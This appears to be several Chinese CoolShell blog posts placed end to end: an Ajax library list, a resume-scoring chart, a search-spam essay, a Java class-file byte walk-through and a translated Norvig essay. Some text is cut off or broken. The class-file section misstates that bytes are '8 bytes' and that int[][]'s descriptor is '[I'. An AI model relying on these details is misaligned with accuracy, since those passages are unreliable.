表单字段帮助信息的自动提示**增强WEB表单的Usability有很多很多的方法，在网上一搜一大片，然后有些时候，用户会被表单搞得很混乱，而且，不同的用户会对表单有不同的理解，其输入也是千奇百怪。所以，为表单字段增加一下自动帮助信息的提示绝对是非常不错的选择。这点在淘宝网上表现得比较出现。下面是一个非常简单短小的教程。
http://woork.blogspot.com/2008/04/improve-form-usability-with- auto.html**12) qGallery (** **演示** **)**虽然这不是一个有丰富功能的图库应用，但这绝对是一个非常优秀的Ajax应用。它基于Prototype Javascript框架（）制作，它对图片集的处理是非常优秀的。而且是它在节省网络带宽方面也很出色。本文写作之时，他目前还在开发阶段，还没有开放给大家下载。不过再等几个星期也就差不多该Release了。**13）Ajax 星式打分（** **源码** **，** **演示** **）**人们总是想给他们身连的事物表达他们的喜恶，所以有一个星式打分控件绝对能满足他们的欲望。一个非常简单的Ajax脚本可以从下面的链接找到：**14）CakePHP Ajax表单**如果你是 Django 或 CakePHP的使用者，那么你应该要感谢CakeBaker 的这个教程——《how to submit a form with Ajax》，而它最强大的功能在于，如果我们的浏览器disable了Javascript，表单照样能够正常提交。
**15）Amberjack 站点导航（** **源码** **，** **演示** **）**在Web开发，Amberjack绝对令人过目难忘的Javascript库，它能够帮助你快速地创建站点导航。Amberjack 最优秀的地方是，这个javascript库只有4K大小，但却有令人难以置信的简易。!\\' /></div>  <div class=**16）Prototype UI（** **源码** **，** **演示** **）**Prototype UI基于Prototype 和Scriptaculous开发而成，它主要提供一堆图形界面的控件，本质上来说，他是一个用户接口类库，这个类库目前还持续增加中。而且所有的控件都可以很方便地定制。**17）JCrop （** **源码** **，** **演示** **）**在线的图片编辑显然是一个很棘手的事，那怕你使用photoshop，你也会觉得很难使用。当然，对于更多人，我们并不需要使用太多太复杂的图片编辑功能，如果有你上传图片的时候有这么一个功能可以让你剪裁你的图片，那么将会是一件很方便的事情。JCrop是一个jQuery 的插件，它允许你上传图片，并提供了非常多丰富的图片剪裁功能。很有前途。
**18）JQuery Auto-tabbing 插件（** **源码** **，** **演示** **）**我们知道，在我们输入WEB表单的时候，当我们输入完一个字段的时候，我们需要按Tab键或是用鼠标去点击下一个输入域，所以，如果有一个好的插件可以让光标自动跳到下一个输入域，这会是一个非常不错的用户体验。这个JQuery的插件可以做到这件事。**19) 表格排序Ajax（** **源码** **）**单击表格头标题可以根据该列对整个表格排序，是一个非常不错的功能。这里有一个非常不错的教程教你如何做到这个事，其最终的Javascript是sortable.js。20) DrasticMap (源码，演示)Google Maps大家都很熟悉了，DrasticMap 可能让你后台的PHP和Mysql数据库同Google Map链动起来，它可以方便地把存储在数据库里的经纬库坐标展示在Google Map上。而且，它相当的灵活，它似乎可以被无限度文章来源：链接# 别的程序员是怎么读你的简历的作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个图片来源国外，是一个关于程序员面试时的简历，被人事部门和程序员本身评审的角度不同的图片。当然，这是一个从国外面试的视角制作的图片，不过，可以看出，其中很多东西都是和国内是相同的。让我们通过这个图片也来了解一下自身吧。
!程序员怎样阅读简历（点击看大图）下面是我对其做的翻译，翻译水平有限，请大家指正。#### 人事部门是这样阅读简历的* （+15分）如果简历中说到了和工作职位相符的技能超过5次以上。   * （+8分）如果简历中说到了和工作职位相符的技能3次到5次。   * （+4分）如果简历中说到了和工作职位相符的技能1次到2次。   * （+4分）Cover Letter（“求职信”或“自荐信”）提到了招聘人员。   * （+2分）简历中有Cover Letter（求职信）。   * （-10分）没有提到和职位描述相关的技能。   * （-15分）没有受过大专教育。#### 程序员是这样阅读简历的* （+15分）曾经因为好玩而写过操作系统或编译器。   * （+12分）简历被LaTeX编译过。   * （+11分）为开源软件贡献过代码。   * （+9分）上学的时候曾经写过操作系统或编译器。   * （+8分）有一个BLOG分享技术知识。   * （+8分）编程/机器人/工程俱乐部主席。   * （+7分）编程/机器人/工程竞赛参与者。   * （+7分）在Google和Microsoft实习过。   * （+6分）使用动态语言（Python/Perl/Ruby）写过非试验性的程序。   * （+5分）知道3种或多于3种的编程语言。   * （+5分）之前的工作和目前的职位有很相似的经验。   * （+4分）有过实习经验。   * （+4分）自己创过业开过公司。   * （+4分）有一个通过Rail, PHP或ASP.NET的个人主页。   * （+3分）有一个自己域名的邮件地址。   * （+3分）改过一些由动态语言（Python/Perl/Ruby）写的程序。   * （+2分）有一个个人主页。   * （+1分）高学历，学习成绩优秀，等。   * （+0分）有奖学金。   * （+0分）在快餐店工作过。   * （-0.5分）Fackbook上有一张看上去喝醉了的照片。   * （-1分）有博士头衔。   * （-2分）有一个一般的求职信。   * （-2分）在简历中说自己懂Word/Excel。   * （-2分）在简历中有拼写和语法错误。   * （-3分）简历的字体太小。   * （-4分）所有的编程经验只是在学校中。   * （-4分）只知道一门编程语言。   * （-6分）简历有三页以上。   * （-6分）简历中有一些无关的东西。   * （-7分）得到过一些课程的认证。   * （-8分）相关专业课程很低的成绩。   * （-10分）在技能中，把Visual Basic列在第一的位置。   * （-12分）在Facebook中，有过光膀子的照片。   * （-15分）简历中的缩进同时使用了空格和Tab键。
我个人觉得其中的很多东西真是说出了程序员的那种特性。（全文完）# Google 需要性爱作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn看到一篇趣文Google Needs Sex，翻译过来。Brad DeLong 给我们写了 两篇关于“Google遇到的麻烦”的文章(墙)，这两篇文章基本上是说， 制造网络欺诈和网络垃圾信息的人会尽其一切努力来和搜索引擎进行博弈，这样一来，其会让搜索到的结果对我们越来越没有帮助（译注：百度的竞价排名成为了制造网络欺诈和网络垃圾信息甚至洗脑的温床）。于是，人们开始去使用其它一些影响地较少的搜索引擎，准确的说，是那些垃圾信息和欺诈信息的东西还不适应于这些搜索引擎。这让我想到了Sex。如果你查看一下进化论，你就会知道为什么有性繁殖是有进化性的，是有可持续性的，而进化也是需要巨大的成本的。为什么自然界不用克隆来繁殖呢？我所理解的最有说服力的答案是—— 防御寄生生物。如果每一代的生物体都和上一代完全的一样，寄生生物就总有一天可以破解生物体的防御，就是为什么！如果我们的某个香蕉园里种植着“克隆香焦” ，那么一旦某种病菌传播开来，那么我们整个香蕉园里的全部香蕉将毁于一旦。所以，混杂基因的模式会让寄生生物或病毒更难破坏我们的防御。
因此，Google的这些欺诈信息和垃圾信息就像是寄生在人体上的寄生体一样，它们已经非常适应Google的搜索引擎。（译注：百度上的寄生体则像是百度自己养的宠物）我不知道“搜索引擎的性爱”会是什么样的，但是很明显，Google需要一些。（全文完）# 为啥搞电脑的会有这么多空闲时间？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn解释一下：* Web程序员—— “正在上传中……”   * 系统管理员——“正在启动中……”   * 黑客——“黑客脚本放出去了……”   * 3D动画制作——“正在渲染中……”   * 咨询顾问——“现在是你的问题了……”   * 程序员——“正在编译中……”*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 实例分析Java Class的文件结构作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**【感谢网友 @Krq_Tiger 投稿】**今天把之前在Evernote中的笔记重新整理了一下，发上来供对java class 文件结构的有兴趣的同学参考一下。
学习Java的朋友应该都知道Java从刚开始的时候就打着平台无关性的旗号，说“一次编写，到处运行”，其实说到无关性，Java平台还有另外一个无关 性那就是语言无关性，要实现语言无关性，那么Java体系中的class的文件结构或者说是字节码就显得相当重要了，其实Java从刚开始的时候就有两套 规范，一个是Java语言规范，另外一个是Java虚拟机规范，Java语言规范只是规定了Java语言相关的约束以及规则，而虚拟机规范则才是真正从跨 平台的角度去设计的。今天我们就以一个实际的例子来看看，到底Java中一个Class文件对应的字节码应该是什么样子。 这篇文章将首先总体上阐述一下Class到底由哪些内容构成，然后再用一个实际的Java类入手去分析class的文件结构。在继续之前，我们首先需要明确如下几点：1）Class文件是有8个字节为基础的字节流构成的，这些字节流之间都严格按照规定的顺序排列，并且字节之间不存在任何空隙，对于超过8个字节的数据，将按 照Big-Endian的顺序存储的，也就是说高位字节存储在低的地址上面，而低位字节存储到高地址上面，其实这也是class文件要跨平台的关键，因为 PowerPC架构的处理采用Big-Endian的存储顺序，而x86系列的处理器则采用Little-Endian的存储顺序，因此为了Class文 件在各中处理器架构下保持统一的存储顺序，虚拟机规范必须对起进行统一。
2） Class文件结构采用类似C语言的结构体来存储数据的，主要有两类数据项，无符号数和表，无符号数用来表述数字，索引引用以及字符串等，比如 u1,u2,u4,u8分别代表1个字节，2个字节，4个字节，8个字节的无符号数，而表是有多个无符号数以及其它的表组成的复合结构。可能大家看到这里 对无符号数和表到底是上面也不是很清楚，不过不要紧，等下面实例的时候，我会再以实例来解释。明确了上面的两点以后，我们接下来后来看看Class文件中按照严格的顺序排列的字节流都具体包含些什么数据：（上图来自The Java Virtual Machine Specification Java SE 7 Edition)在看上图的时候，有一点我们需要注意，比如cp_info，cp_info表示常量池，上图中用 constant_pool[constant_pool_count-1]的方式来表示常量池有constant_pool_count-1个常量，它 这里是采用数组的表现形式，但是大家不要误以为所有的常量池的常量长度都是一样的，其实这个地方只是为了方便描述采用了数组的方式，但是这里并不像编程语 言那里，一个int型的数组，每个int长度都一样。明确了这一点以后，我们在回过头来看看上图中每一项都具体代表了什么含义。
1）u4 magic 表示魔数，并且魔数占用了4个字节，魔数到底是做什么的呢？它其实就是表示一下这个文件的类型是一个Class文件，而不是一张JPG图片，或者AVI的电影。而Class文件对应的魔数是0xCAFEBABE.2）u2 minor_version 表示Class文件的次版本号，并且此版本号是u2类型的无符号数表示。3） u2 major_version 表示Class文件的主版本号，并且主版本号是u2类型的无符号数表示。major_version和minor_version主要用来表示当前的虚拟 机是否接受当前这种版本的Class文件。不同版本的Java编译器编译的Class文件对应的版本是不一样的。高版本的虚拟机支持低版本的编译器编译的 Class文件结构。比如Java SE 6.0对应的虚拟机支持Java SE 5.0的编译器编译的Class文件结构，反之则不行。4） u2 constant_pool_count 表示常量池的数量。这里我们需要重点来说一下常量池是什么东西，请大家不要与Jvm内存模型中的运行时常量池混淆了，Class文件中常量池主要存储了字 面量以及符号引用，其中字面量主要包括字符串，final常量的值或者某个属性的初始值等等，而符号引用主要存储类和接口的全限定名称，字段的名称以及描 述符，方法的名称以及描述符，这里名称可能大家都容易理解，至于描述符的概念，放到下面说字段表以及方法表的时候再说。另外大家都知道Jvm的内存模型中 有堆，栈，方法区，程序计数器构成，而方法区中又存在一块区域叫运行时常量池，运行时常量池中存放的东西其实也就是编译器长生的各种字面量以及符号引用， 只不过运行时常量池具有动态性，它可以在运行的时候向其中增加其它的常量进去，最具代表性的就是String的intern方法。
5）cp_info 表示常量池，这里面就存在了上面说的各种各样的字面量和符号引用。放到常量池的中数据项在The Java Virtual Machine Specification Java SE 7 Edition 中一共有14个常量，每一种常量都是一个表，并且每种常量都用一个公共的部分tag来表示是哪种类型的常量。下面分别简单描述一下具体细节等到后面的实例 中我们再细化。* CONSTANT_Utf8_info tag标志位为1, UTF-8编码的字符串   * CONSTANT_Integer_info tag标志位为3， 整形字面量   * CONSTANT_Float_info tag标志位为4， 浮点型字面量   * CONSTANT_Long_info tag标志位为5， 长整形字面量   * CONSTANT_Double_info tag标志位为6， 双精度字面量   * CONSTANT_Class_info tag标志位为7， 类或接口的符号引用   * CONSTANT_String_info tag标志位为8，字符串类型的字面量   * CONSTANT_Fieldref_info tag标志位为9, 字段的符号引用   * CONSTANT_Methodref_info tag标志位为10，类中方法的符号引用   * CONSTANT_InterfaceMethodref_info tag标志位为11, 接口中方法的符号引用   * CONSTANT_NameAndType_info tag 标志位为12，字段和方法的名称以及类型的符号引用
6） u2 access_flags 表示类或者接口的访问信息，具体如下图所示：7）u2 this_class 表示类的常量池索引，指向常量池中CONSTANT_Class_info的常量8）u2 super_class 表示超类的索引，指向常量池中CONSTANT_Class_info的常量9）u2 interface_counts 表示接口的数量10）u2 interface[interface_counts]表示接口表，它里面每一项都指向常量池中CONSTANT_Class_info常量11）u2 fields_count 表示类的实例变量和类变量的数量12） field_info fields[fields_count]表示字段表的信息，其中字段表的结构如下图所示：上图中access_flags表示字段的访问表示，比如字段是public,private，protect 等，name_index表示字段名 称，指向常量池中类型是CONSTANT_UTF8_info的常量，descriptor_index表示字段的描述符，它也指向常量池中类型为 CONSTANT_UTF8_info的常量，attributes_count表示字段表中的属性表的数量，而属性表是则是一种用与描述字段，方法以及 类的属性的可扩展的结构，不同版本的Java虚拟机所支持的属性表的数量是不同的。
13） u2 methods_count表示方法表的数量14）method_info 表示方法表，方法表的具体结构如下图所示：其中access_flags表示方法的访问表示，name_index表示名称的索引，descriptor_index表示方法的描述 符，attributes_count以及attribute_info类似字段表中的属性表，只不过字段表和方法表中属性表中的属性是不同的，比如方法 表中就Code属性，表示方法的代码，而字段表中就没有Code属性。其中具体Class中到底有多少种属性，等到Class文件结构中的属性表的时候再 说说。15） attribute_count表示属性表的数量，说到属性表，我们需要明确以下几点：* 属性表存在于Class文件结构的最后，字段表，方法表以及Code属性中，也就是说属性表中也可以存在属性表   * 属性表的长度是不固定的，不同的属性，属性表的长度是不同的上面说完了Class文件结构中每一项的构成以后，我们以一个实际的例子来解释以下上面所说的内容。package com.ejushang.TestClass;private static final int staticVar = 0;
private int instanceVar=0;}通过jdk1.6.0_37的javac 编译后的TestClass.java对应的TestClass.class的二进制结构如下图所示：下面我们就根据前面所说的Class的文件结构来解析以下上图中字节流。**1）魔数**   从Class的文件结构我们知道，刚开始的4个字节是魔数，上图中从地址00000000h-00000003h的内容就是魔数，从上图可知Class的文件的魔数是0xCAFEBABE。**2）主次版本号**   接下来的4个字节是主次版本号，有上图可知从00000004h-00000005h对应的是0x0000,因此Class的minor_version 为0x0000,从00000006h-00000007h对应的内容为0x0032,因此Class文件的major_version版本为 0x0032,这正好就是jdk1.6.0不带target参数编译后的Class对应的主次版本。**3）常量池的数量**   接下来的2个字节从00000008h-00000009h表示常量池的数量，由上图可以知道其值为0x0018，十进制为24个,但是对于常量池的数量 需要明确一点，常量池的数量是constant_pool_count-1，为什么减一，是因为索引0表示class中的数据项不引用任何常量池中的常 量。
**4）常量池**   我们上面说了常量池中有不同类型的常量，下面就来看看TestClass.class的第一个常量，我们知道每个常量都有一个u1类型的tag标识来表示 常量的类型，上图中0000000ah处的内容为0x0A，转换成二级制是10，有上面的关于常量类型的描述可知tag为10的常量是Constant_Methodref_info,而Constant_Methodref_info的结够如下图所示：其中class_index指向常量池中类型为CONSTANT_Class_info的常量，从TestClass的二进制文件结构中可以看出 class_index的值为0x0004（地址为0000000bh-0000000ch)，也就是说指向第四个常量。name_and_type_index指向常量池中类型为CONSTANT_NameAndType_info常量。从上图可以看出name_and_type_index的值为0x0013，表示指向常量池中的第19个常量。接下来又可以通过同样的方法来找到常量池中的所有常量。不过JDK提供了一个方便的工具可以让我们查看常量池中所包含的常量。通过javap -verbose TestClass 即可得到所有常量池中的常量，截图如下：
从上图我们可以清楚的看到，TestClass中常量池有24个常量，不要忘记了第0个常量，因为第0个常量被用来表示 Class中的数据项不引用任何常量池中的常量。从上面的分析中我们得知TestClass的第一个常量表示方法，其中class_index指向的第四 个常量为java/lang/Object，name_and_type_index指向的第19个常量值为<init>:()V,从这里可 以看出第一个表示方法的常量表示的是java编译器生成的实例构造器方法。通过同样的方法可以分析常量池的其它常量。OK，分析完常量池，我们接下来再分 析下access_flags。   **5）u2 access_flags** 表示类或者接口方面的访问信息，比如Class表示的是类还是接口，是否为public,static，final等。具体访问标示的含义之前已经说过 了，下面我们就来看看TestClass的访问标示。Class的访问标示是从0000010dh-0000010e，期值为0x0021，根据前面说的 各种访问标示的标志位，我们可以知道：0x0021=0x0001|0x0020 也即ACC_PUBLIC 和 ACC_SUPER为真，其中ACC_PUBLIC大家好理解，ACC_SUPER是jdk1.2之后编译的类都会带有的标志。
**6）u2 this_class** 表示类的索引值，用来表示类的全限定名称，类的索引值如下图所示：从上图可以清楚到看到，类索引值为0x0003，对应常量池的第三个常量，通过javap的结果，我们知道第三个常量为 CONSTANT_Class_info类型的常量，通过它可以知道类的全限定名称为：com/ejushang/TestClass /TestClass**7）u2 super_class** 表示当前类的父类的索引值，索引值所指向的常量池中类型为CONSTANT_Class_info的常量，父类的索引值如下图所示，其值为0x0004, 查看常量池的第四个常量，可知TestClass的父类的全限定名称为：java/lang/Object**8）interfaces_count和 interfaces[interfaces_count]** 表示接口数量以及具体的每一个接口，TestClass的接口数量以及接口如下图所示，其中 0x0001表示接口数量为1，而0x0005表示接口在常量池的索引值，找到常量池的第五个常量，其类型为CONSTANT_Class_info，其 值为：com/ejushang/TestClass/Super
**9）fields_count 和 field_info** , fields_count表示类中field_info表的数量，而field_info表示类的实例变量和类变量，这里需要注意的是 field_info不包含从父类继承过来的字段，field_info的结构如下图所示：其中access_flags表示字段的访问标示，比如public,private,protected，static,final等，access_flags的取值如下图所示：其中name_index 和 descriptor_index都是常量池的索引值，分别表示字段的名称和字段的描述符，字段的名称容易理解，但是字段的描述符如何理解呢？其实在JVM 规范中，对于字段的描述符规定如下图所示：其中大家需要关注一下上图最后一行，它表示的是对一维数组的描述符，对于String[][]的描述符将是[[ Ljava/lang/String,而对于int[][]的描述符为[I。接下来的attributes_count以及 attribute_info分别表示属性表的数量以及属性表。下面我们还是以上面的TestClass为例，来看看TestClass的字段表吧。
首先我们来看一下字段的数量，TestClass的字段的数量如下图所示：![从上图中可以看出TestClass有两个字段，查看TestClass的源代码可知，确实也只有两个字段，接下来我们看看第一个字段，我们知道第一个字段应该为private int staticVar,它在Class文件中的二进制表示如下图所示：其中0x001A表示访问标示，通过查看access_flags表可知，其为ACC_PRIVATE,ACC_STATIC,ACC_FINAL,接下 来0x0006和0x0007分别表示常量池中第6和第7个常量，通过查看常量池可知，其值分别为：staticVar和I，其中staticVar为字 段名称，而I为字段的描述符，通过上面对描述符的解释，I所描述的是int类型的变量，接下来0x0001表示staticVar这个字段表中的属性表的 数量，从上图可以staticVar字段对应的属性表有1个，0x0008表示常量池中的第8个常量，查看常量池可以得知此属性为 ConstantValue属性，而ConstantValue属性的格式如下图所示：其中attribute_name_index表述属性名的常量池索引，本例中为ConstantValue，而ConstantValue的 attribute_length固定长度为2，而constantValue_index表示常量池中的引用，本例中，其中为0x0009，查看第9个 常量可以知道，它表示一个类型为CONSTANT_Integer_info的常量，其值为0。
上面说完了private static final int staticVar=0，下面我们接着说一下TestClass的private int instanceVar=0,在本例中对instanceVar的二进制表示如下图所示：其中0x0002表示访问标示为ACC_PRIVATE,0x000A表示字段的名称，它指向常量池中的第10个常量，查看常量池可以知道字段名称为 instanceVar，而0x0007表示字段的描述符，它指向常量池中的第7个常量，查看常量池可以知道第7个常量为I，表示类型为 instanceVar的类型为I，最后0x0000表示属性表的数量为0.**10）methods_count 和 method_info** ，其中methods_count表示方法的数量，而method_info表示的方法表，其中方法表的结构如下图所示：从上图可以看出method_info和field_info的结构是很类似的，方法表的access_flag的所有标志位以及取值如下图所示：其中name_index和descriptor_index表示的是方法的名称和描述符，他们分别是指向常量池的索引。这里需要结解释一下方法的描述 符，方法的描述符的结构为：（参数列表）返回值，比如public int instanceMethod(int param)的描述符为：（I）I，表示带有一个int类型参数且返回值也为int类型的方法，接下来就是属性数量以及属性表了，方法表和字段表虽然都有 属性数量和属性表，但是他们里面所包含的属性是不同。接下来我们就以TestClass来看一下方法表的二进制表示。首先来看一下方法表数量，截图如下：
从上图可以看出方法表的数量为0x0002表示有两个方法，接下来我们来分析第一个方法，我们首先来看一下TestClass的第一个方法的access_flag，name_index,descriptor_index，截图如下：从上图可以知道access_flags为0x0001，从上面对access_flags标志位的描述，可知方法的access_flags的取值为 ACC_PUBLIC,name_index为0x000B，查看常量池中的第11个常量，知道方法的名称为<init>，0x000C表示 descriptor_index表示常量池中的第12常量，其值为()V,表示<init>方法没有参数和返回值，其实这是编译器自动生成 的实例构造器方法。接下来的0x0001表示<init>方法的方法表有1个属性，属性截图如下：从上图可以看出0x000D对应的常量池中的常量为Code,表示的方法的Code属性，所以到这里大家应该明白方法的那些代码是存储在Class文件方法表中的属性表中的Code属性中。接下来我们在分析一下Code属性，Code属性的结构如下图所示：其中attribute_name_index指向常量池中值为Code的常量，attribute_length的长度表示Code属性表的长度（这里 需要注意的时候长度不包括attribute_name_index和attribute_length的6个字节的长度）。
max_stack表示最大栈深度，虚拟机在运行时根据这个值来分配栈帧中操作数的深度，而max_locals代表了局部变量表的存储空间。max_locals的单位为slot，slot是虚拟机为局部变量分配内存的最小单元，在运行时，对于不超过32位类型的数据类型，比如 byte,char,int等占用1个slot，而double和Long这种64位的数据类型则需要分配2个slot，另外max_locals的值并 不是所有局部变量所需要的内存数量之和，因为slot是可以重用的，当局部变量超过了它的作用域以后，局部变量所占用的slot就会被重用。code_length代表了字节码指令的数量，而code表示的时候字节码指令，从上图可以知道code的类型为u1,一个u1类型的取值为0x00-0xFF,对应的十进制为0-255，目前虚拟机规范已经定义了200多条指令。exception_table_length以及exception_table分别代表方法对应的异常信息。attributes_count和attribute_info分别表示了Code属性中的属性数量和属性表，从这里可以看出Class的文件结构中，属性表是很灵活的，它可以存在于Class文件，方法表，字段表以及Code属性中。
接下来我们继续以上面的例子来分析一下，从上面init方法的Code属性的截图中可以看出，属性表的长度为0x00000026,max_stack的 值为0x0002,max_locals的取值为0x0001,code_length的长度为0x0000000A，那么00000149h- 00000152h为字节码，接下来exception_table_length的长度为0x0000，而attribute_count的值为 0x0001，00000157h-00000158h的值为0x000E,它表示常量池中属性的名称，查看常量池得知第14个常量的值为 LineNumberTable，LineNumberTable用于描述java源代码的行号和字节码行号的对应关系，它不是运行时必需的属性，如果通 过-g:none的编译器参数来取消生成这项信息的话，最大的影响就是异常发生的时候，堆栈中不能显示出出错的行号，调试的时候也不能按照源代码来设置断 点，接下来我们再看一下LineNumberTable的结构如下图所示：其中attribute_name_index上面已经提到过，表示常量池的索引，attribute_length表示属性长度，而start_pc和 line_number分表表示字节码的行号和源代码的行号。本例中LineNumberTable属性的字节流如下图所示：
上面分析完了TestClass的第一个方法，通过同样的方式我们可以分析出TestClass的第二个方法，截图如下：其中access_flags为0x0001,name_index为0x000F,descriptor_index为0x0010，通过查看常量池可 以知道此方法为public int instanceMethod(int param)方法。通过和上面类似的方法我们可以知道instanceMethod的Code属性为下图所示：最后我们来分析一下，Class文件的属性，从00000191h-00000199h为Class文件中的属性表，其中0x0011表示属性的名称，查看常量池可以知道属性名称为SourceFile，我们再来看看SourceFile的结构如下图所示：其中attribute_length为属性的长度，sourcefile_index指向常量池中值为源代码文件名称的常量，在本例中SourceFile属性截图如下：其中attribute_length为0x00000002表示长度为2个字节，而soucefile_index的值为0x0012,查看常量池的第18个常量可以知道源代码文件的名称为TestClass.java
最后，希望对技术感兴趣的朋友多交流。个人微博：（)(全文完)# “21天教你学会C++”作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个《Teach Yourself C++ in 21 Days》的流程图，请各位程序员同仁认真领会。如果有必要，你可以查看这个图书以作参照：看完上面这个图片，我在想，我学习C++有12年了，好像C++也没有学得特别懂，看到STL和泛型，还是很头大。不过，我应该去考虑研究量子物理和生物化学，这样，我才能重返98年杀掉还在大学的我，然后达到21天搞定C++的目标。另外，得要特别提醒刚刚开始学习C++的朋友，第21天的时候，小心被人杀害。呵呵。当然，上面只是一个恶搞此类图片，学习一门技术，需要你很长的时间，正如图片中的第三图和第四图所示，你需要用十年的时间去不断在尝试，并在错误中总结经验教训，以及在项目开发中通过与别人相互沟通互相学习来历练自己。你才能算得上是真正学会。这里有篇文章叫《 **Teach Yourself Programming in Ten Years**》，网上有人翻译了一下，不过原文已被更新了，我把网上的译文转载并更新如下：
###### 用十年来学编程   Peter Norvig#### 为什么每个人都急不可耐？走进任何一家书店，你会看见《Teach Yourself Java in 7 Days》（7天Java无师自通）的旁边是一长排看不到尽头的类似书籍，它们要教会你Visual Basic、Windows、Internet等等，而只需要几天甚至几小时。我在Amazon.com上进行了如下搜索：pubdate: after 1992 and title: days and (title: learn or title: teach yourself)(出版日期：1992年后 and 书名：天 and （书名：学会 or 书名：无师自通）)我一共得到了248个搜索结果。前面的78个是计算机书籍（第79个是《Learn Bengali in 30 days》，30天学会孟加拉语）。我把关键词“days”换成“hours”，得到了非常相似的结果：这次有253本书，头77本是计算机书籍，第78本是《Teach Yourself Grammar and Style in 24 Hours》（24小时学会文法和文体）。头200本书中，有96%是计算机书籍。
结论是，要么是人们非常急于学会计算机，要么就是不知道为什么计算机惊人地简单，比任何东西都容易学会。没有一本书是要在几天里教会人们欣赏贝多芬或者量子物理学，甚至怎样给狗打扮。在《 _How to Design Programs_ 》这本书里说“ _Bad programming is easy. Idiots can learn it in 21 days, even if they are dummies.”_ （坏的程序是很容易的，就算他们是笨蛋白痴都可以在21天内学会。）让我们来分析一下像《Learn C++ in Three Days》（3天学会C++）这样的题目到底是什么意思：* **学会** ：在3天时间里，你不够时间写一些有意义的程序，并从它们的失败与成功中学习。你不够时间跟一些有经验的程序员一起工作，你不会知道在C++那样的环境中是什么滋味。简而言之，没有足够的时间让你学到很多东西。所以这些书谈论的只是表面上的精通，而非深入的理解。如Alexander Pope（英国诗人、作家，1688-1744）所言， **一知半解是危险的（a little learning is a dangerous thing）**   * **C++** ：在3天时间里你可以学会C++的语法（如果你已经会一门类似的语言），但你无法学到多少如何运用这些语法。简而言之，如果你是，比如说一个Basic程序员，你可以学会用C++语法写出Basic风格的程序，但你学不到C++真正的优点（和缺点）。那关键在哪里？Alan Perlis（ACM第一任主席，图灵奖得主，1922-1990）曾经说过：“ **如果一门语言不能影响你对编程的想法，那它就不值得去学** ”。另一种观点是，有时候你不得不学一点C++（更可能是javascript和Flash Flex之类）的皮毛，因为你需要接触现有的工具，用来完成特定的任务。但此时你不是在学习如何编程，你是在学习如何完成任务。   * **3天** ：不幸的是，这是不够的，正如下一节所言。
#### 10年学编程一些研究者（Bloom (1985), Bryan & Harter (1899), Hayes (1989), Simmon & Chase (1973)）的研究表明，在许多领域，都需要大约10 年时间才能培养出专业技能，包括国际象棋、作曲、绘画、钢琴、游泳、网球，以及神经心理学和拓扑学的研究。似乎并不存在真正的捷径：即使是莫扎特，他4 岁就显露出音乐天才，在他写出世界级的音乐之前仍然用了超过13年时间。再看另一种音乐类型的披头士，他们似乎是在1964年的Ed Sullivan节目中突然冒头的。但其实他们从1957年就开始表演了，即使他们很早就显示出了巨大的吸引力，他们第一次真正的成功——Sgt. Peppers——也要到1967年才发行。Malcolm Gladwell 研究报告称，把在伯林音乐学院学生一个班的学生按水平分成高中低，然后问他们对音乐练习花了多少工夫：> > 在这三个小组中的每一个人基本上都是从相同的时间开始练习的（在五岁的时候）。在开始的几年里，每个人都是每周练习2-3个小时。但是在八岁的时候，练习的强度开始显现差异。在这个班中水平最牛的人开始比别人练习得更多——在九岁的时候每周练习6个小时，十二岁的时候，每周8个小时，十四岁的时候每周16个小时，并在成长过程中练习得越来越多，到20岁的时候，其每周练习可超过30个小时。到了20岁，这些优秀者在其生命中练习音乐总共超过 > 10,000 小时。与之对比，其它人只平均有8,000小时，而未来只能留校当老师的人仅仅是4,000 小时。
所以，这也许需要10,000 小时，并不是十年，但这是一个magic number。Samuel Johnson（英国诗人）认为10 年还是不够的：“ **任何领域的卓越成就都只能通过一生的努力来获得；稍低一点的代价也换不来。** ”（Excellence in any department can be attained only by the labor of a lifetime; it is not to be purchased at a lesser price.） 乔叟（Chaucer，英国诗人，1340-1400）也抱怨说：“ **生命如此短暂，掌握技艺却要如此长久。** ”（the lyf so short, the craft so long to lerne.）下面是我在编程这个行当里获得成功的处方：* 对编程感兴趣，因为乐趣而去编程。确定始终都能保持足够的乐趣，以致你能够将10年时间投入其中。   * 跟其他程序员交谈；阅读其他程序。这比任何书籍或训练课程都更重要。   * 编程。最好的学习是从实践中学习。用更加技术性的语言来讲，“个体在特定领域最高水平的表现不是作为长期的经验的结果而自动获得的，但即使是非常富有经验的个体也可以通过刻意的努力而提高其表现水平。”（p. 366），而且“最有效的学习要求为特定个体制定适当难度的任务，有意义的反馈，以及重复及改正错误的机会。”（p. 20-21）《Cognition in Practice: Mind, Mathematics, and Culture in Everyday Life》（在实践中认知：心智、数学和日常生活的文化）是关于这个观点的一本有趣的参考书。   * 如果你愿意，在大学里花上4年时间（或者再花几年读研究生）。这能让你获得一些工作的入门资格，还能让你对此领域有更深入的理解，但如果你不喜欢进学校，（作出一点牺牲）你在工作中也同样能获得类似的经验。在任何情况下，单从书本上学习都是不够的。“计算机科学的教育不会让任何人成为内行的程序员，正如研究画笔和颜料不会让任何人成为内行的画家”, Eric Raymond，《The New Hacker’s Dictionary》（新黑客字典）的作者如是说。我曾经雇用过的最优秀的程序员之一仅有高中学历；但他创造出了许多伟大的软件（XEmacs, Mozilla），甚至有讨论他本人的新闻组，而且股票期权让他达到我无法企及的富有程度（译注：指Jamie Zawinski，Xemacs和Netscape的作者）。   * 跟别的程序员一起完成项目。在一些项目中成为最好的程序员；在其他一些项目中当最差的一个。当你是最好的程序员时，你要测试自己领导项目的能力，并通过你的洞见鼓舞其他人。当你是最差的时候，你学习高手们在做些什么，以及他们不喜欢做什么（因为他们让你帮他们做那些事）。   * 接手别的程序员完成项目。用心理解别人编写的程序。看看在没有最初的程序员在场的时候理解和修改程序需要些什么。想一想怎样设计你的程序才能让别人接手维护你的程序时更容易一些。   * 学会至少半打编程语言。包括一门支持类抽象（class abstraction）的语言（如Java或C++），一门支持函数抽象（functional abstraction）的语言（如Lisp或ML），一门支持句法抽象（syntactic abstraction）的语言（如Lisp），一门支持说明性规约（declarative specification）的语言（如Prolog或C++模版），一门支持协程（coroutine）的语言（如Icon或Scheme），以及一门支持并行处理（parallelism）的语言（如Sisal）。   * 